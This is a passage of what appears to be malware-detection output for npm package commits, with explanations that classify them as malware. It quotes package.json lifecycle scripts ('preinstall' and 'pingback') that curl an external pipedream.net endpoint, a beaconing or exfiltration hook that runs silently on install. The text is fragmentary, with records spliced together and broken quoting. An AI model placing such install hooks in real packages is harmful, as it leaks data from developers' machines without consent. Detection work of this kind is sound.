This constitutes unauthorized data exfiltration and is a classic indicator of malicious telemetry.\n\n**Summary:** Static analysis reveals that the commit introduces code that harvests sensitive host data and transmits it to an external, untrusted endpoint without user consent. Such behavior aligns with data\u2011leak and exfiltration patterns typical of malware, leading to a MALWARE verdict."

    "explanation": "**File package.json**:\nCode: `\"preinstall\": \"curl https://eo536ohsnextro9.m.pipedream.net\"`\nReason: The preinstall script runs automatically during npm install and makes an outbound HTTP request to an untrusted domain, enabling silent data exfiltration or beaconing.\n\n**File package.json**:\nCode: `\"pingback\": \"curl https://eo536ohsnextro9.m.pipedream.net\"`\nReason: Provides a manual trigger for the same external request, allowing an attacker or compromised developer to send data on demand.\n\n**Summary:** Static analysis reveals high\u2011severity suspicious network access via npm lifecycle scripts that contact an external server without justification. Such behavior is characteristic of malicious code, and no mitigating evidence was found in dynamic analysis. Therefore the commit is classified as malware."

These behaviors collectively indicate malicious intent rather than benign functionality."
